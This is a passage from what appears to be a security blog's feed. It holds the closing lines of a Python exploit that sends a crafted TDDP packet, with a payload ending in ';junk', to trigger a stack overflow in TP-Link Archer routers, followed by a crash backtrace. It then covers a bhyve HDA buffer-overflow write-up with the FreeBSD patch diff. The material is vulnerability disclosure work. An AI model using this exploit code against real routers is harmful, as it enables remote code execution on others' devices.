&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s;junk&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#0  0xff7277a8 in strnlen () from /lib/libc.so.0
#1  0xff722050 in _vfprintf_internal () from /lib/libc.so.0
#2  0xff71f3c8 in vsnprintf () from /lib/libc.so.0
#3  0x000092cc in ?? ()
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;p&gt;References:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;https://mjg59.dreamwidth.org/51672.html?thread=1916120&lt;/li&gt;
&lt;/ol&gt;</content><author><name></name></author><summary type="html">CMD_FTEST_CONFIG in the TP-Link Device Debug protocol in TP-Link Wireless Router Archer Router version 1.0.0 Build 20180502 rel.45702 (EU) and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.</summary></entry><entry><title type="html">BSD Hypervisor - Theoretical Stack-based Buffer Overflow</title><link href="http://localhost:4000/blog/bhyve_hda_bof/" rel="alternate" type="text/html" title="BSD Hypervisor - Theoretical Stack-based Buffer Overflow" /><published>2019-06-25T00:00:00+08:00</published><updated>2019-06-25T00:00:00+08:00</updated><id>http://localhost:4000/blog/bhyve_hda_bof</id><content type="html" xml:base="http://localhost:4000/blog/bhyve_hda_bof/">&lt;p&gt;On Jun 24, a new PCI HDAudio device model from the Google Summer of Code 2016 project was added into the BSD Hypervisor (bhyve) as part of its sound card emulation. I took a chance to look at the source code and found a trivial stack-based buffer overflow but unfortunately it is not exploitable in practice due to the limitation of bhyve’s arguments length. However, the code is patched just in case it is still going to be an issue in the future.&lt;/p&gt;

&lt;p&gt;Patch diff:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;Index: head/usr.sbin/bhyve/pci_hda.c
===================================================================
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- head/usr.sbin/bhyve/pci_hda.c	(revision 349384)
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ head/usr.sbin/bhyve/pci_hda.c	(revision 349385)
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -1,1332 +1,1331 @@&lt;/span&gt;
 /*-
  * SPDX-License-Identifier: BSD-2-Clause-FreeBSD
  *
  * Copyright (c) 2016 Alex Teaca &amp;lt;iateaca@FreeBSD.org&amp;gt;
  * All rights reserved.
  *
  * Redistribution and use in source and binary forms, with or without
  * modification, are permitted provided that the following conditions
  * are met:
  * 1. Redistributions of source code must retain the above copyright
  *    notice, this list of conditions and the following disclaimer.
  * 2. Redistributions in binary form must reproduce the above copyright
  *    notice, this list of conditions and the following disclaimer in the
  *    documentation and/or other materials provided with the distribution.
  *
  * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND
  * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
  * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
  * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
  * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
  * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
  * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
  * SUCH DAMAGE.
  *
  */
 
 #include &amp;lt;sys/cdefs.h&amp;gt;
 __FBSDID(&quot;$FreeBSD$&quot;);
 
 #include &amp;lt;time.h&amp;gt;
 
 #include &quot;pci_hda.h&quot;
 #include &quot;bhyverun.h&quot;
 #include &quot;pci_emul.h&quot;
 #include &quot;hdac_reg.h&quot;
 
 /*
  * HDA defines
  */
 #define PCIR_HDCTL		0x40
 #define INTEL_VENDORID		0x8086
 #define HDA_INTEL_82801G	0x27d8
 
 #define HDA_IOSS_NO		0x08
 #define HDA_OSS_NO		0x04
 #define HDA_ISS_NO		0x04
 #define HDA_CODEC_MAX		0x0f
 #define HDA_LAST_OFFSET						\
 	(0x2084 + ((HDA_ISS_NO) * 0x20) + ((HDA_OSS_NO) * 0x20))
 #define HDA_SET_REG_TABLE_SZ					\
 	(0x80 + ((HDA_ISS_NO) * 0x20) + ((HDA_OSS_NO) * 0x20))
 #define HDA_CORB_ENTRY_LEN	0x04
 #define HDA_RIRB_ENTRY_LEN	0x08
 #define HDA_BDL_ENTRY_LEN	0x10
 #define HDA_DMA_PIB_ENTRY_LEN	0x08
 #define HDA_STREAM_TAGS_CNT	0x10
 #define HDA_STREAM_REGS_BASE	0x80
 #define HDA_STREAM_REGS_LEN	0x20
 
 #define HDA_DMA_ACCESS_LEN	(sizeof(uint32_t))
 #define HDA_BDL_MAX_LEN		0x0100
 
 #define HDAC_SDSTS_FIFORDY	(1 &amp;lt;&amp;lt; 5)
 
 #define HDA_RIRBSTS_IRQ_MASK	(HDAC_RIRBSTS_RINTFL | HDAC_RIRBSTS_RIRBOIS)
 #define HDA_STATESTS_IRQ_MASK	((1 &amp;lt;&amp;lt; HDA_CODEC_MAX) - 1)
 #define HDA_SDSTS_IRQ_MASK					\
 	(HDAC_SDSTS_DESE | HDAC_SDSTS_FIFOE | HDAC_SDSTS_BCIS)
 
 /*
  * HDA data structures
  */
 
 struct hda_softc;
 
 typedef void (*hda_set_reg_handler)(struct hda_softc *sc, uint32_t offset,
 		uint32_t old);
 
 struct hda_bdle {
 	uint32_t addrh;
 	uint32_t addrl;
 	uint32_t ioc;
 	uint32_t len;
 } __packed;
 
 struct hda_bdle_desc {
 	void *addr;
 	uint8_t ioc;
 	uint32_t len;
 };
 
 struct hda_codec_cmd_ctl {
 	char *name;
 	void *dma_vaddr;
 	uint8_t run;
 	uint16_t rp;
 	uint16_t size;
 	uint16_t wp;
 };
 
 struct hda_stream_desc {
 	uint8_t dir;
 	uint8_t run;
 	uint8_t stream;
 
 	/* bp is the no. of bytes transferred in the current bdle */
 	uint32_t bp;
 	/* be is the no. of bdles transferred in the bdl */
 	uint32_t be;
 
 	uint32_t bdl_cnt;
 	struct hda_bdle_desc bdl[HDA_BDL_MAX_LEN];
 };
 
 struct hda_softc {
 	struct pci_devinst *pci_dev;
 	uint32_t regs[HDA_LAST_OFFSET];
 
 	uint8_t lintr;
 	uint8_t rirb_cnt;
 	uint64_t wall_clock_start;
 
 	struct hda_codec_cmd_ctl corb;
 	struct hda_codec_cmd_ctl rirb;
 
 	uint8_t codecs_no;
 	struct hda_codec_inst *codecs[HDA_CODEC_MAX];
 
 	/* Base Address of the DMA Position Buffer */
 	void *dma_pib_vaddr;
 
 	struct hda_stream_desc streams[HDA_IOSS_NO];
 	/* 2 tables for output and input */
 	uint8_t stream_map[2][HDA_STREAM_TAGS_CNT];
 };
 
 /*
  * HDA module function declarations
  */
 static inline void hda_set_reg_by_offset(struct hda_softc *sc, uint32_t offset,
     uint32_t value);
 static inline uint32_t hda_get_reg_by_offset(struct hda_softc *sc,
     uint32_t offset);
 static inline void hda_set_field_by_offset(struct hda_softc *sc,
     uint32_t offset, uint32_t mask, uint32_t value);
 
 static uint8_t hda_parse_config(const char *opts, const char *key, char *val);
 static struct hda_softc *hda_init(const char *opts);
 static void hda_update_intr(struct hda_softc *sc);
 static void hda_response_interrupt(struct hda_softc *sc);
 static int hda_codec_constructor(struct hda_softc *sc,
     struct hda_codec_class *codec, const char *play, const char *rec,
     const char *opts);
 static struct hda_codec_class *hda_find_codec_class(const char *name);
 
 static int hda_send_command(struct hda_softc *sc, uint32_t verb);
 static int hda_notify_codecs(struct hda_softc *sc, uint8_t run,
     uint8_t stream, uint8_t dir);
 static void hda_reset(struct hda_softc *sc);
 static void hda_reset_regs(struct hda_softc *sc);
 static void hda_stream_reset(struct hda_softc *sc, uint8_t stream_ind);
 static int hda_stream_start(struct hda_softc *sc, uint8_t stream_ind);
 static int hda_stream_stop(struct hda_softc *sc, uint8_t stream_ind);
 static uint32_t hda_read(struct hda_softc *sc, uint32_t offset);
 static int hda_write(struct hda_softc *sc, uint32_t offset, uint8_t size,
     uint32_t value);
 
 static inline void hda_print_cmd_ctl_data(struct hda_codec_cmd_ctl *p);
 static int hda_corb_start(struct hda_softc *sc);
 static int hda_corb_run(struct hda_softc *sc);
 static int hda_rirb_start(struct hda_softc *sc);
 
 static void *hda_dma_get_vaddr(struct hda_softc *sc, uint64_t dma_paddr,
     size_t len);
 static void hda_dma_st_dword(void *dma_vaddr, uint32_t data);
 static uint32_t hda_dma_ld_dword(void *dma_vaddr);
 
 static inline uint8_t hda_get_stream_by_offsets(uint32_t offset,
     uint8_t reg_offset);
 static inline uint32_t hda_get_offset_stream(uint8_t stream_ind);
 
 static void hda_set_gctl(struct hda_softc *sc, uint32_t offset, uint32_t old);
 static void hda_set_statests(struct hda_softc *sc, uint32_t offset,
     uint32_t old);
 static void hda_set_corbwp(struct hda_softc *sc, uint32_t offset, uint32_t old);
 static void hda_set_corbctl(struct hda_softc *sc, uint32_t offset,
     uint32_t old);
 static void hda_set_rirbctl(struct hda_softc *sc, uint32_t offset,
     uint32_t old);
 static void hda_set_rirbsts(struct hda_softc *sc, uint32_t offset,
     uint32_t old);
 static void hda_set_dpiblbase(struct hda_softc *sc, uint32_t offset,
     uint32_t old);
 static void hda_set_sdctl(struct hda_softc *sc, uint32_t offset, uint32_t old);
 static void hda_set_sdctl2(struct hda_softc *sc, uint32_t offset, uint32_t old);
 static void hda_set_sdsts(struct hda_softc *sc, uint32_t offset, uint32_t old);
 
 static int hda_signal_state_change(struct hda_codec_inst *hci);
 static int hda_response(struct hda_codec_inst *hci, uint32_t response,
     uint8_t unsol);
 static int hda_transfer(struct hda_codec_inst *hci, uint8_t stream,
     uint8_t dir, void *buf, size_t count);
 
 static void hda_set_pib(struct hda_softc *sc, uint8_t stream_ind, uint32_t pib);
 static uint64_t hda_get_clock_ns(void);
 
 /*
  * PCI HDA function declarations
  */
 static int pci_hda_init(struct vmctx *ctx, struct pci_devinst *pi, char *opts);
 static void pci_hda_write(struct vmctx *ctx, int vcpu, struct pci_devinst *pi,
     int baridx, uint64_t offset, int size, uint64_t value);
 static uint64_t pci_hda_read(struct vmctx *ctx, int vcpu, struct pci_devinst *pi,
     int baridx, uint64_t offset, int size);
 /*
  * HDA global data
  */
 
 static const hda_set_reg_handler hda_set_reg_table[] = {
 	[HDAC_GCTL] = hda_set_gctl,
 	[HDAC_STATESTS] = hda_set_statests,
 	[HDAC_CORBWP] = hda_set_corbwp,
 	[HDAC_CORBCTL] = hda_set_corbctl,
 	[HDAC_RIRBCTL] = hda_set_rirbctl,
 	[HDAC_RIRBSTS] = hda_set_rirbsts,
 	[HDAC_DPIBLBASE] = hda_set_dpiblbase,
 
 #define HDAC_ISTREAM(n, iss, oss)				\
 	[_HDAC_ISDCTL(n, iss, oss)] = hda_set_sdctl,		\
 	[_HDAC_ISDCTL(n, iss, oss) + 2] = hda_set_sdctl2,	\
 	[_HDAC_ISDSTS(n, iss, oss)] = hda_set_sdsts,		\
 
 #define HDAC_OSTREAM(n, iss, oss)				\
 	[_HDAC_OSDCTL(n, iss, oss)] = hda_set_sdctl,		\
 	[_HDAC_OSDCTL(n, iss, oss) + 2] = hda_set_sdctl2,	\
 	[_HDAC_OSDSTS(n, iss, oss)] = hda_set_sdsts,		\
 
 	HDAC_ISTREAM(0, HDA_ISS_NO, HDA_OSS_NO)
 	HDAC_ISTREAM(1, HDA_ISS_NO, HDA_OSS_NO)
 	HDAC_ISTREAM(2, HDA_ISS_NO, HDA_OSS_NO)
 	HDAC_ISTREAM(3, HDA_ISS_NO, HDA_OSS_NO)
 
 	HDAC_OSTREAM(0, HDA_ISS_NO, HDA_OSS_NO)
 	HDAC_OSTREAM(1, HDA_ISS_NO, HDA_OSS_NO)
 	HDAC_OSTREAM(2, HDA_ISS_NO, HDA_OSS_NO)
 	HDAC_OSTREAM(3, HDA_ISS_NO, HDA_OSS_NO)
 
 	[HDA_SET_REG_TABLE_SZ] = NULL,
 };
 
 static const uint16_t hda_corb_sizes[] = {
 	[HDAC_CORBSIZE_CORBSIZE_2]	= 2,
 	[HDAC_CORBSIZE_CORBSIZE_16]	= 16,
 	[HDAC_CORBSIZE_CORBSIZE_256]	= 256,
 	[HDAC_CORBSIZE_CORBSIZE_MASK]	= 0,
 };
 
 static const uint16_t hda_rirb_sizes[] = {
 	[HDAC_RIRBSIZE_RIRBSIZE_2]	= 2,
 	[HDAC_RIRBSIZE_RIRBSIZE_16]	= 16,
 	[HDAC_RIRBSIZE_RIRBSIZE_256]	= 256,
 	[HDAC_RIRBSIZE_RIRBSIZE_MASK]	= 0,
 };
 
 static struct hda_ops hops = {
 	.signal		= hda_signal_state_change,
 	.response	= hda_response,
 	.transfer	= hda_transfer,
 };
 
 struct pci_devemu pci_de_hda = {
 	.pe_emu		= &quot;hda&quot;,
 	.pe_init	= pci_hda_init,
 	.pe_barwrite	= pci_hda_write,
 	.pe_barread	= pci_hda_read
 };
 
 PCI_EMUL_SET(pci_de_hda);
 
 SET_DECLARE(hda_codec_class_set, struct hda_codec_class);
 
 #if DEBUG_HDA == 1
 FILE *dbg;
 #endif
 
 /*
  * HDA module function definitions
  */
 
 static inline void
 hda_set_reg_by_offset(struct hda_softc *sc, uint32_t offset, uint32_t value)
 {
 	assert(offset &amp;lt; HDA_LAST_OFFSET);
 	sc-&amp;gt;regs[offset] = value;
 }
 
 static inline uint32_t
 hda_get_reg_by_offset(struct hda_softc *sc, uint32_t offset)
 {
 	assert(offset &amp;lt; HDA_LAST_OFFSET);
 	return sc-&amp;gt;regs[offset];
 }
 
 static inline void
 hda_set_field_by_offset(struct hda_softc *sc, uint32_t offset,
     uint32_t mask, uint32_t value)
 {
 	uint32_t reg_value = 0;
 
 	reg_value = hda_get_reg_by_offset(sc, offset);
 
 	reg_value &amp;amp;= ~mask;
 	reg_value |= (value &amp;amp; mask);
 
 	hda_set_reg_by_offset(sc, offset, reg_value);
 }
 
 static uint8_t
 hda_parse_config(const char *opts, const char *key, char *val)
 {
 	char buf[64];
 	char *s = buf;
 	char *tmp = NULL;
&lt;span class=&quot;gd&quot;&gt;-	int len;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+	size_t len;
&lt;/span&gt; 	int i;
 
 	if (!opts)
 		return (0);
 
 	len = strlen(opts);
&lt;span class=&quot;gd&quot;&gt;-
-	if (len &amp;gt;= 64) {
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+	if (len &amp;gt;= sizeof(buf)) {
&lt;/span&gt; 		DPRINTF(&quot;Opts too big\n&quot;);
 		return (0);
 	}
 
 	DPRINTF(&quot;opts: %s\n&quot;, opts);
 
 	strcpy(buf, opts);
 
 	for (i = 0; i &amp;lt; len; i++)
 		if (buf[i] == ',') {
 			buf[i] = 0;
 			tmp = buf + i + 1;
 			break;
 		}
 
 	if (!memcmp(s, key, strlen(key))) {
 		strncpy(val, s + strlen(key), 64);
 		return (1);
 	}
 
 	if (!tmp)
 		return (0);
 
 	s = tmp;
 	if (!memcmp(s, key, strlen(key))) {
 		strncpy(val, s + strlen(key), 64);
 		return (1);
 	}
 
 	return (0);
 }
 
 static struct hda_softc *
 hda_init(const char *opts)
 {
 	struct hda_softc *sc = NULL;
 	struct hda_codec_class *codec = NULL;
 	char play[64];
 	char rec[64];
 	int err, p, r;
 
 #if DEBUG_HDA == 1
 	dbg = fopen(&quot;/tmp/bhyve_hda.log&quot;, &quot;w+&quot;);
 #endif
 
 	DPRINTF(&quot;opts: %s\n&quot;, opts);
 
 	sc = calloc(1, sizeof(*sc));
 	if (!sc)
 		return (NULL);
 
 	hda_reset_regs(sc);
 
 	/*
 	 * TODO search all the codecs declared in opts
 	 * For now we play with one single codec
 	 */
 	codec = hda_find_codec_class(&quot;hda_codec&quot;);
 	if (codec) {
 		p = hda_parse_config(opts, &quot;play=&quot;, play);
 		r = hda_parse_config(opts, &quot;rec=&quot;, rec);
 		DPRINTF(&quot;play: %s rec: %s\n&quot;, play, rec);
 		if (p | r) {
 			err = hda_codec_constructor(sc, codec, p ?	\
 				play : NULL, r ? rec : NULL, NULL);
 			assert(!err);
 		}
 	}
 
 	return (sc);
 }
 
 static void
 hda_update_intr(struct hda_softc *sc)
 {
 	struct pci_devinst *pi = sc-&amp;gt;pci_dev;
 	uint32_t intctl = hda_get_reg_by_offset(sc, HDAC_INTCTL);
 	uint32_t intsts = 0;
 	uint32_t sdsts = 0;
 	uint32_t rirbsts = 0;
 	uint32_t wakeen = 0;
 	uint32_t statests = 0;
 	uint32_t off = 0;
 	int i;
 
 	/* update the CIS bits */
 	rirbsts = hda_get_reg_by_offset(sc, HDAC_RIRBSTS);
 	if (rirbsts &amp;amp; (HDAC_RIRBSTS_RINTFL | HDAC_RIRBSTS_RIRBOIS))
 		intsts |= HDAC_INTSTS_CIS;
 
 	wakeen = hda_get_reg_by_offset(sc, HDAC_WAKEEN);
 	statests = hda_get_reg_by_offset(sc, HDAC_STATESTS);
 	if (statests &amp;amp; wakeen)
 		intsts |= HDAC_INTSTS_CIS;
 
 	/* update the SIS bits */
 	for (i = 0; i &amp;lt; HDA_IOSS_NO; i++) {
 		off = hda_get_offset_stream(i);
 		sdsts = hda_get_reg_by_offset(sc, off + HDAC_SDSTS);
 		if (sdsts &amp;amp; HDAC_SDSTS_BCIS)
 			intsts |= (1 &amp;lt;&amp;lt; i);
 	}
 
 	/* update the GIS bit */
 	if (intsts)
 		intsts |= HDAC_INTSTS_GIS;
 
 	hda_set_reg_by_offset(sc, HDAC_INTSTS, intsts);
 
 	if ((intctl &amp;amp; HDAC_INTCTL_GIE) &amp;amp;&amp;amp; ((intsts &amp;amp;			\
 		~HDAC_INTSTS_GIS) &amp;amp; intctl)) {
 		if (!sc-&amp;gt;lintr) {
 			pci_lintr_assert(pi);
 			sc-&amp;gt;lintr = 1;
 		}
 	} else {
 		if (sc-&amp;gt;lintr) {
 			pci_lintr_deassert(pi);
 			sc-&amp;gt;lintr = 0;
 		}
 	}
 }
 
 static void
 hda_response_interrupt(struct hda_softc *sc)
 {
 	uint8_t rirbctl = hda_get_reg_by_offset(sc, HDAC_RIRBCTL);
 
 	if ((rirbctl &amp;amp; HDAC_RIRBCTL_RINTCTL) &amp;amp;&amp;amp; sc-&amp;gt;rirb_cnt) {
 		sc-&amp;gt;rirb_cnt = 0;
 		hda_set_field_by_offset(sc, HDAC_RIRBSTS, HDAC_RIRBSTS_RINTFL,
 				HDAC_RIRBSTS_RINTFL);
 		hda_update_intr(sc);
 	}
 }
 
 static int
 hda_codec_constructor(struct hda_softc *sc, struct hda_codec_class *codec,
     const char *play, const char *rec, const char *opts)
 {
 	struct hda_codec_inst *hci = NULL;
 
 	if (sc-&amp;gt;codecs_no &amp;gt;= HDA_CODEC_MAX)
 		return (-1);
 
 	hci = calloc(1, sizeof(struct hda_codec_inst));
 	if (!hci)
 		return (-1);
 
 	hci-&amp;gt;hda = sc;
 	hci-&amp;gt;hops = &amp;amp;hops;
 	hci-&amp;gt;cad = sc-&amp;gt;codecs_no;
 	hci-&amp;gt;codec = codec;
 
 	sc-&amp;gt;codecs[sc-&amp;gt;codecs_no++] = hci;
 
 	if (!codec-&amp;gt;init) {
 		DPRINTF(&quot;This codec does not implement the init function\n&quot;);
 		return (-1);
 	}
 
 	return (codec-&amp;gt;init(hci, play, rec, opts));
 }
 
 static struct hda_codec_class *
 hda_find_codec_class(const char *name)
 {
 	struct hda_codec_class **pdpp = NULL, *pdp = NULL;
 
 	SET_FOREACH(pdpp, hda_codec_class_set) {
 		pdp = *pdpp;
 		if (!strcmp(pdp-&amp;gt;name, name)) {
 			return (pdp);
 		}
 	}
 
 	return (NULL);
 }
 
 static int
 hda_send_command(struct hda_softc *sc, uint32_t verb)
 {
 	struct hda_codec_inst *hci = NULL;
 	struct hda_codec_class *codec = NULL;
 	uint8_t cad = (verb &amp;gt;&amp;gt; HDA_CMD_CAD_SHIFT) &amp;amp; 0x0f;
 
 	hci = sc-&amp;gt;codecs[cad];
 	if (!hci)
 		return (-1);
 
 	DPRINTF(&quot;cad: 0x%x verb: 0x%x\n&quot;, cad, verb);
 
 	codec = hci-&amp;gt;codec;
 	assert(codec);
 
 	if (!codec-&amp;gt;command) {
 		DPRINTF(&quot;This codec does not implement the command function\n&quot;);
 		return (-1);
 	}
 
 	return (codec-&amp;gt;command(hci, verb));
 }
 
 static int
 hda_notify_codecs(struct hda_softc *sc, uint8_t run, uint8_t stream,
     uint8_t dir)
 {
 	struct hda_codec_inst *hci = NULL;
 	struct hda_codec_class *codec = NULL;
 	int err;
 	int i;
 
 	/* Notify each codec */
 	for (i = 0; i &amp;lt; sc-&amp;gt;codecs_no; i++) {
 		hci = sc-&amp;gt;codecs[i];
 		assert(hci);
 
 		codec = hci-&amp;gt;codec;
 		assert(codec);
 
 		if (codec-&amp;gt;notify) {
 			err = codec-&amp;gt;notify(hci, run, stream, dir);
 			if (!err)
 				break;
 		}
 	}
 
 	return (i == sc-&amp;gt;codecs_no ? (-1) : 0);
 }
 
 static void
 hda_reset(struct hda_softc *sc)
 {
 	int i;
 	struct hda_codec_inst *hci = NULL;
 	struct hda_codec_class *codec = NULL;
 
 	hda_reset_regs(sc);
 
 	/* Reset each codec */
 	for (i = 0; i &amp;lt; sc-&amp;gt;codecs_no; i++) {
 		hci = sc-&amp;gt;codecs[i];
 		assert(hci);
 
 		codec = hci-&amp;gt;codec;
 		assert(codec);
 
 		if (codec-&amp;gt;reset)
 			codec-&amp;gt;reset(hci);
 	}
 
 	sc-&amp;gt;wall_clock_start = hda_get_clock_ns();
 }
 
 static void
 hda_reset_regs(struct hda_softc *sc)
 {
 	uint32_t off = 0;
 	uint8_t i;
 
 	DPRINTF(&quot;Reset the HDA controller registers ...\n&quot;);
 
 	memset(sc-&amp;gt;regs, 0, sizeof(sc-&amp;gt;regs));
 
 	hda_set_reg_by_offset(sc, HDAC_GCAP,
 			HDAC_GCAP_64OK |
 			(HDA_ISS_NO &amp;lt;&amp;lt; HDAC_GCAP_ISS_SHIFT) |
 			(HDA_OSS_NO &amp;lt;&amp;lt; HDAC_GCAP_OSS_SHIFT));
 	hda_set_reg_by_offset(sc, HDAC_VMAJ, 0x01);
 	hda_set_reg_by_offset(sc, HDAC_OUTPAY, 0x3c);
 	hda_set_reg_by_offset(sc, HDAC_INPAY, 0x1d);
 	hda_set_reg_by_offset(sc, HDAC_CORBSIZE,
 	    HDAC_CORBSIZE_CORBSZCAP_256 | HDAC_CORBSIZE_CORBSIZE_256);
 	hda_set_reg_by_offset(sc, HDAC_RIRBSIZE,
 	    HDAC_RIRBSIZE_RIRBSZCAP_256 | HDAC_RIRBSIZE_RIRBSIZE_256);
 
 	for (i = 0; i &amp;lt; HDA_IOSS_NO; i++) {
 		off = hda_get_offset_stream(i);
 		hda_set_reg_by_offset(sc, off + HDAC_SDFIFOS, HDA_FIFO_SIZE);
 	}
 }
 
 static void
 hda_stream_reset(struct hda_softc *sc, uint8_t stream_ind)
 {
 	struct hda_stream_desc *st = &amp;amp;sc-&amp;gt;streams[stream_ind];
 	uint32_t off = hda_get_offset_stream(stream_ind);
 
 	DPRINTF(&quot;Reset the HDA stream: 0x%x\n&quot;, stream_ind);
 
 	/* Reset the Stream Descriptor registers */
 	memset(sc-&amp;gt;regs + HDA_STREAM_REGS_BASE + off, 0, HDA_STREAM_REGS_LEN);
 
 	/* Reset the Stream Descriptor */
 	memset(st, 0, sizeof(*st));
 
 	hda_set_field_by_offset(sc, off + HDAC_SDSTS,
 	    HDAC_SDSTS_FIFORDY, HDAC_SDSTS_FIFORDY);
 	hda_set_field_by_offset(sc, off + HDAC_SDCTL0,
 	    HDAC_SDCTL_SRST, HDAC_SDCTL_SRST);
 }
 
 static int
 hda_stream_start(struct hda_softc *sc, uint8_t stream_ind)
 {
 	struct hda_stream_desc *st = &amp;amp;sc-&amp;gt;streams[stream_ind];
 	struct hda_bdle_desc *bdle_desc = NULL;
 	struct hda_bdle *bdle = NULL;
 	uint32_t lvi = 0;
 	uint32_t bdl_cnt = 0;
 	uint64_t bdpl = 0;
 	uint64_t bdpu = 0;
 	uint64_t bdl_paddr = 0;
 	void *bdl_vaddr = NULL;
 	uint32_t bdle_sz = 0;
 	uint64_t bdle_addrl = 0;
 	uint64_t bdle_addrh = 0;
 	uint64_t bdle_paddr = 0;
 	void *bdle_vaddr = NULL;
 	uint32_t off = hda_get_offset_stream(stream_ind);
 	uint32_t sdctl = 0;
 	uint8_t strm = 0;
 	uint8_t dir = 0;
 	int i;
 
 	assert(!st-&amp;gt;run);
 
 	lvi = hda_get_reg_by_offset(sc, off + HDAC_SDLVI);
 	bdpl = hda_get_reg_by_offset(sc, off + HDAC_SDBDPL);
 	bdpu = hda_get_reg_by_offset(sc, off + HDAC_SDBDPU);
 
 	bdl_cnt = lvi + 1;
 	assert(bdl_cnt &amp;lt;= HDA_BDL_MAX_LEN);
 
 	bdl_paddr = bdpl | (bdpu &amp;lt;&amp;lt; 32);
 	bdl_vaddr = hda_dma_get_vaddr(sc, bdl_paddr,
 	    HDA_BDL_ENTRY_LEN * bdl_cnt);
 	if (!bdl_vaddr) {
 		DPRINTF(&quot;Fail to get the guest virtual address\n&quot;);
 		return (-1);
 	}
 
 	DPRINTF(&quot;stream: 0x%x bdl_cnt: 0x%x bdl_paddr: 0x%lx\n&quot;,
 	    stream_ind, bdl_cnt, bdl_paddr);
 
 	st-&amp;gt;bdl_cnt = bdl_cnt;
 
 	bdle = (struct hda_bdle *)bdl_vaddr;
 	for (i = 0; i &amp;lt; bdl_cnt; i++, bdle++) {
 		bdle_sz = bdle-&amp;gt;len;
 		assert(!(bdle_sz % HDA_DMA_ACCESS_LEN));
 
 		bdle_addrl = bdle-&amp;gt;addrl;
 		bdle_addrh = bdle-&amp;gt;addrh;
 
 		bdle_paddr = bdle_addrl | (bdle_addrh &amp;lt;&amp;lt; 32);
 		bdle_vaddr = hda_dma_get_vaddr(sc, bdle_paddr, bdle_sz);
 		if (!bdle_vaddr) {
 			DPRINTF(&quot;Fail to get the guest virtual address\n&quot;);
 			return (-1);
 		}
 
 		bdle_desc = &amp;amp;st-&amp;gt;bdl[i];
 		bdle_desc-&amp;gt;addr = bdle_vaddr;
 		bdle_desc-&amp;gt;len = bdle_sz;
 		bdle_desc-&amp;gt;ioc = bdle-&amp;gt;ioc;
 
 		DPRINTF(&quot;bdle: 0x%x bdle_sz: 0x%x\n&quot;, i, bdle_sz);
 	}
 
 	sdctl = hda_get_reg_by_offset(sc, off + HDAC_SDCTL0);
